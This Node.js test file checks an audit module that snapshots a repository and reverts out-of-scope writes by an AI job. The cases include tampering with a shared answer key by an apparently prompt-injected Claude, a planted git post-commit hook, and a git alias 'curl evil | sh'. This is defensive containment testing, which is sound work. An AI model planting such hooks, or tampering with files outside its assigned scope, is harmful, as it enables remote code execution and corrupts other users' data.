'use strict';

const { test } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const audit = require('../server/audit');

function 임시저장소() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'qnet-audit-'));
}
function 쓰기(root, rel, content) {
  const p = path.join(root, rel);
  fs.mkdirSync(path.dirname(p), { recursive: true });
  fs.writeFileSync(p, content, 'utf8');
  return p;
}
function 읽기(p) {
  return fs.readFileSync(p, 'utf8');
}

test('클린 잡: 목적지 내부 신규/수정은 유지되고 clean=true', () => {
  const root = 임시저장소();
  const dest = path.join(root, 'notes');
  fs.mkdirSync(dest, { recursive: true });
  쓰기(root, 'notes/기존.md', '원본');

  const snap = audit.snapshot({ monitorRoots: [root], integrityTargets: [] });
  // 목적지 내부 변경(허용).
  쓰기(root, 'notes/기존.md', '보강됨');
  쓰기(root, 'notes/신규.md', '새 노트');

  const rep = audit.audit(snap, { jobKind: 'record', destinations: [dest], nickname: 'hun' });
  assert.strictEqual(rep.clean, true);
  assert.strictEqual(rep.jobReverted, false);
  assert.strictEqual(읽기(path.join(root, 'notes/기존.md')), '보강됨');
  assert.ok(fs.existsSync(path.join(root, 'notes/신규.md')));
});

test('경계 위반: 목적지 밖 신규 파일 삭제 + 목적지 내 변경까지 잡 전체 원복', () => {
  const root = 임시저장소();
  const dest = path.join(root, 'notes');
  fs.mkdirSync(dest, { recursive: true });
  쓰기(root, 'notes/개념.md', '원본');

  const snap = audit.snapshot({ monitorRoots: [root], integrityTargets: [] });
  // 목적지 내 정당 변경 + 목적지 밖 스트레이 쓰기(위반).
  쓰기(root, 'notes/개념.md', '수정');
  쓰기(root, 'stray.md', '경계 밖 침투');

  const rep = audit.audit(snap, { jobKind: 'record', destinations: [dest], nickname: 'hun' });
  assert.strictEqual(rep.clean, false);
  assert.strictEqual(rep.jobReverted, true);
  // 잡 전체 원복: 목적지 밖 신규 삭제 + 목적지 내 변경도 pre-job 상태로 복원.
  assert.strictEqual(fs.existsSync(path.join(root, 'stray.md')), false);
  assert.strictEqual(읽기(path.join(root, 'notes/개념.md')), '원본');
});

test('경계 위반: 목적지 밖 기존 파일 수정 원복', () => {
  const root = 임시저장소();
  const dest = path.join(root, 'notes');
  fs.mkdirSync(dest, { recursive: true });
  쓰기(root, '이웃.md', '남의 원본');

  const snap = audit.snapshot({ monitorRoots: [root], integrityTargets: [] });
  쓰기(root, '이웃.md', '변조됨');

  const rep = audit.audit(snap, { jobKind: 'record', destinations: [dest], nickname: 'hun' });
  assert.strictEqual(rep.clean, false);
  assert.strictEqual(읽기(path.join(root, '이웃.md')), '남의 원본');
});

test('공유 해설 섹션 불변식: 타인 섹션 변조 시 원복', () => {
  const root = 임시저장소();
  const 풀이 = path.join(root, '풀이', '2023-1-필기');
  fs.mkdirSync(풀이, { recursive: true });
  const 원본 = ['## alice (2026-01-01)', '앨리스 해설', '', '## hun (2026-02-02)', '내 해설', ''].join('\n');
  쓰기(root, '풀이/2023-1-필기/1.md', 원본);

  const snap = audit.snapshot({ monitorRoots: [root], integrityTargets: [] });
  // 타인(alice) 섹션을 건드림 → 불변식 위반.
  const 변조 = ['## alice (2026-01-01)', '앨리스 해설 변조!', '', '## hun (2026-02-02)', '내 해설 보강', ''].join('\n');
  쓰기(root, '풀이/2023-1-필기/1.md', 변조);

  const rep = audit.audit(snap, {
    jobKind: 'record',
    destinations: [풀이],
    sharedRoots: [풀이],
    nickname: 'hun',
  });
  assert.strictEqual(rep.clean, false);
  assert.strictEqual(읽기(path.join(root, '풀이/2023-1-필기/1.md')), 원본);
});

test('공유 해설 섹션 불변식: 내 섹션만 갱신하면 통과', () => {
  const root = 임시저장소();
  const 풀이 = path.join(root, '풀이', '2023-1-필기');
  fs.mkdirSync(풀이, { recursive: true });
  const 원본 = ['## alice (2026-01-01)', '앨리스 해설', '', '## hun (2026-02-02)', '내 해설', ''].join('\n');
  쓰기(root, '풀이/2023-1-필기/1.md', 원본);

  const snap = audit.snapshot({ monitorRoots: [root], integrityTargets: [] });
  const 갱신 = ['## alice (2026-01-01)', '앨리스 해설', '', '## hun (2026-02-02)', '내 해설 보강!', ''].join('\n');
  쓰기(root, '풀이/2023-1-필기/1.md', 갱신);

  const rep = audit.audit(snap, {
    jobKind: 'record',
    destinations: [풀이],
    sharedRoots: [풀이],
    nickname: 'hun',
  });
  assert.strictEqual(rep.clean, true);
  assert.strictEqual(읽기(path.join(root, '풀이/2023-1-필기/1.md')), 갱신);
});

test('공유 해설 최초 생성: 내 섹션만 있는 신규 파일 유지', () => {
  const root = 임시저장소();
  const 풀이 = path.join(root, '풀이', '2023-1-필기');
  fs.mkdirSync(풀이, { recursive: true });

  const snap = audit.snapshot({ monitorRoots: [root], integrityTargets: [] });
  const 신규 = ['## hun (2026-02-02)', '내 첫 해설', ''].join('\n');
  쓰기(root, '풀이/2023-1-필기/2.md', 신규);

  const rep = audit.audit(snap, {
    jobKind: 'record',
    destinations: [풀이],
    sharedRoots: [풀이],
    nickname: 'hun',
  });
  assert.strictEqual(rep.clean, true, rep.violations.join(','));
  assert.ok(fs.existsSync(path.join(root, '풀이/2023-1-필기/2.md')));
});

test('공유 해설 최초 생성: 타인 섹션 포함 신규 파일은 삭제', () => {
  const root = 임시저장소();
  const 풀이 = path.join(root, '풀이', '2023-1-필기');
  fs.mkdirSync(풀이, { recursive: true });

  const snap = audit.snapshot({ monitorRoots: [root], integrityTargets: [] });
  const 신규 = ['## bob (2026-02-02)', '남을 사칭', ''].join('\n');
  쓰기(root, '풀이/2023-1-필기/3.md', 신규);

  const rep = audit.audit(snap, {
    jobKind: 'record',
    destinations: [풀이],
    sharedRoots: [풀이],
    nickname: 'hun',
  });
  assert.strictEqual(rep.clean, false);
  assert.strictEqual(fs.existsSync(path.join(root, '풀이/2023-1-필기/3.md')), false);
});

test('챗 잡: 어떤 파일 변경도 무변화 원칙 위반 → 원복', () => {
  const root = 임시저장소();
  쓰기(root, 'notes/a.md', '원본');

  const snap = audit.snapshot({ monitorRoots: [root], integrityTargets: [] });
  쓰기(root, 'notes/a.md', '챗이 몰래 수정');
  쓰기(root, 'notes/b.md', '챗이 몰래 생성');

  const rep = audit.audit(snap, { jobKind: 'chat', destinations: [], nickname: 'hun' });
  assert.strictEqual(rep.clean, false);
  assert.strictEqual(읽기(path.join(root, 'notes/a.md')), '원본');
  assert.strictEqual(fs.existsSync(path.join(root, 'notes/b.md')), false);
});

test('무결성 감시: config.json 변조 감지·복원', () => {
  const root = 임시저장소();
  const cfg = 쓰기(root, '.qnet-web/config.json', '{"nickname":"hun"}');
  fs.mkdirSync(path.join(root, 'notes'), { recursive: true });

  const snap = audit.snapshot({
    monitorRoots: [root],
    integrityTargets: [{ label: 'config.json', path: cfg }],
  });
  // 잡이 config를 변조(walk 제외 대상이라 별도 해시 감시로만 탐지).
  fs.writeFileSync(cfg, '{"nickname":"attacker"}', 'utf8');

  const rep = audit.audit(snap, {
    jobKind: 'record',
    destinations: [path.join(root, 'notes')],
    integrityTargets: [{ label: 'config.json', path: cfg }],
    nickname: 'hun',
  });
  assert.strictEqual(rep.clean, false);
  assert.ok(rep.violations.some((v) => v.includes('config.json')));
  assert.strictEqual(읽기(cfg), '{"nickname":"hun"}');
});

test('무결성 감시: .git/hooks 훅 심기 탐지·제거', () => {
  const root = 임시저장소();
  const hooks = path.join(root, '.git', 'hooks');
  fs.mkdirSync(hooks, { recursive: true });
  fs.mkdirSync(path.join(root, 'notes'), { recursive: true });

  const snap = audit.snapshot({
    monitorRoots: [root],
    integrityTargets: [{ label: '.git/hooks', path: hooks }],
  });
  // 지속화 시도: post-commit 훅 심기.
  fs.writeFileSync(path.join(hooks, 'post-commit'), '#!/bin/sh\ncurl evil', 'utf8');

  const rep = audit.audit(snap, {
    jobKind: 'record',
    destinations: [path.join(root, 'notes')],
    integrityTargets: [{ label: '.git/hooks', path: hooks }],
    nickname: 'hun',
  });
  assert.strictEqual(rep.clean, false);
  assert.strictEqual(fs.existsSync(path.join(hooks, 'post-commit')), false);
});

test('sharedExplanationOk 순수 함수 동작', () => {
  const before = '## alice\n앨리스\n## hun\n원본\n';
  const okAfter = '## alice\n앨리스\n## hun\n보강\n';
  const badAfter = '## alice\n변조\n## hun\n보강\n';
  assert.strictEqual(audit.sharedExplanationOk(Buffer.from(before), Buffer.from(okAfter), 'hun'), true);
  assert.strictEqual(audit.sharedExplanationOk(Buffer.from(before), Buffer.from(badAfter), 'hun'), false);
  // 최초 생성(before=null): 내 섹션만이면 통과.
  assert.strictEqual(audit.sharedExplanationOk(null, Buffer.from('## hun\n내용\n'), 'hun'), true);
  assert.strictEqual(audit.sharedExplanationOk(null, Buffer.from('## bob\n사칭\n'), 'hun'), false);
});

// ── 보안 검토 round-1 회귀 테스트 ────────────────────────────────────────

test('[F1] 전역 감사: record 잡이 목적지 밖 공유 정답 키 변조 → 경계 위반 잡 전체 원복', () => {
  const root = 임시저장소();
  const notesDir = path.join(root, '기사', '정보처리기사', 'hun', 'notes');
  const 정답Dir = path.join(root, '기사', '정보처리기사', '_공통', '기출문제', '정답');
  fs.mkdirSync(notesDir, { recursive: true });
  const 정답Key = 쓰기(root, '기사/정보처리기사/_공통/기출문제/정답/2023-1-필기.md', '원본 정답 키');
  쓰기(root, '기사/정보처리기사/hun/notes/개념.md', '노트 원본');

  // F1: monitorRoots=[repoRoot] 전역 감시, 승인 목적지는 notesDir 뿐.
  const snap = audit.snapshot({ monitorRoots: [root], integrityTargets: [], repoRoot: root });
  // 인젝션된 claude가 목적지(notes) 밖 공유 정답 키를 변조 + 자기 노트도 수정.
  fs.writeFileSync(정답Key, '변조된 정답 키(공격)', 'utf8');
  쓰기(root, '기사/정보처리기사/hun/notes/개념.md', '노트 수정');

  const rep = audit.audit(snap, {
    jobKind: 'record',
    destinations: [notesDir],
    nickname: 'hun',
    repoRoot: root,
  });
  assert.strictEqual(rep.clean, false);
  assert.strictEqual(rep.jobReverted, true);
  // 공유 정답 키 원복 + 목적지 내 노트도 잡 전체 원복.
  assert.strictEqual(읽기(정답Key), '원본 정답 키');
  assert.strictEqual(읽기(path.join(root, '기사/정보처리기사/hun/notes/개념.md')), '노트 원본');
  assert.ok(rep.violations.some((v) => v.includes('정답')));
});

test('[F2] 무결성 감시: .git/config 변조(alias 심기) 탐지·복원', () => {
  const root = 임시저장소();
  const gitConfig = 쓰기(root, '.git/config', '[core]\n\trepositoryformatversion = 0\n');
  fs.mkdirSync(path.join(root, 'notes'), { recursive: true });

  const snap = audit.snapshot({
    monitorRoots: [root],
    integrityTargets: [{ label: '.git/config', path: gitConfig }],
    repoRoot: root,
  });
  // git config로 임의 명령 심기(alias.x = !evil).
  fs.writeFileSync(gitConfig, '[core]\n\trepositoryformatversion = 0\n[alias]\n\tx = !curl evil | sh\n', 'utf8');

  const rep = audit.audit(snap, {
    jobKind: 'record',
    destinations: [path.join(root, 'notes')],
    nickname: 'hun',
    repoRoot: root,
  });
  assert.strictEqual(rep.clean, false);
  assert.ok(rep.violations.some((v) => v.includes('.git/config')));
  assert.strictEqual(읽기(gitConfig), '[core]\n\trepositoryformatversion = 0\n');
});

test('[F4] 공백 닉네임 섹션: 소유자 절단 없이 보호 + 동일 소유자 다중 섹션 보존', () => {
  // 이전 /^##\s+(\S+)/ 는 "김 철수"를 "김"으로 절단 → 오원복·Map 충돌. 이제 날짜 앞 전체가 소유자.
  const before = ['## 김 철수 (2026-01-01)', '철수 해설', '', '## hun (2026-02-02)', '내 해설', ''].join('\n');
  const b = audit.splitSections(before);
  assert.ok(b.sections.has('김 철수'), '공백 포함 닉네임이 온전히 파싱되어야 함');
  assert.ok(b.sections.has('hun'));

  // 타인(김 철수) 섹션 변조 → 위반.
  const bad = ['## 김 철수 (2026-01-01)', '철수 해설 변조!', '', '## hun (2026-02-02)', '내 해설', ''].join('\n');
  assert.strictEqual(audit.sharedExplanationOk(Buffer.from(before), Buffer.from(bad), 'hun'), false);

  // 동일 소유자(hun) 다중 섹션 — 하나만 있던 것에 추가는 OK, 기존 것 변조는 위반.
  const dup = ['## 김 철수 (2026-01-01)', '철수 해설', '', '## hun (2026-02-02)', '내 해설', '', '## hun (2026-03-03)', '두번째', ''].join('\n');
  assert.strictEqual(audit.sharedExplanationOk(Buffer.from(before), Buffer.from(dup), 'hun'), true);
});

test('[F5] 대용량 비목적지 파일: 지문(버퍼 미보관)으로 변경 탐지 + 자동복원불가 보고', () => {
  const root = 임시저장소();
  fs.mkdirSync(path.join(root, 'notes'), { recursive: true });
  const big = path.join(root, 'big.pdf');
  fs.writeFileSync(big, Buffer.alloc(audit.MAX_RESTORE_BYTES + 1024, 1)); // >1MB

  const snap = audit.snapshot({ monitorRoots: [root], integrityTargets: [], repoRoot: root });
  // 지문만 보관됐는지 확인(버퍼 미보관 = 메모리 절약).
  assert.strictEqual(snap.files.get(big).buf, null);

  // 대용량 파일 변조(비 git 저장소 → git 복원 폴백 실패 → 자동복원불가).
  fs.appendFileSync(big, Buffer.alloc(16, 2));
  const rep = audit.audit(snap, {
    jobKind: 'record',
    destinations: [path.join(root, 'notes')],
    nickname: 'hun',
    repoRoot: root,
  });
  assert.strictEqual(rep.clean, false);
  assert.ok(rep.unrestorable.includes(big)); // 대용량·미추적 → 자동 복원 불가 목록에 포함
});

test('[F6] 목적지 내 개인 노트 수정 → 원복 아닌 경고(clean 유지)', () => {
  const root = 임시저장소();
  const notesDir = path.join(root, 'notes');
  fs.mkdirSync(notesDir, { recursive: true });
  쓰기(root, 'notes/개념.md', '## 세부항목1\n원본');

  const snap = audit.snapshot({ monitorRoots: [root], integrityTargets: [], repoRoot: root });
  쓰기(root, 'notes/개념.md', '## 세부항목1\n원본\n## 세부항목2\n보강');

  const rep = audit.audit(snap, { jobKind: 'record', destinations: [notesDir], nickname: 'hun', repoRoot: root });
  assert.strictEqual(rep.clean, true); // 경고는 clean을 깨지 않음
  assert.strictEqual(읽기(path.join(root, 'notes/개념.md')), '## 세부항목1\n원본\n## 세부항목2\n보강'); // 원복 안 함
  assert.ok(rep.warnings.some((w) => w.includes('개인 노트')));
});
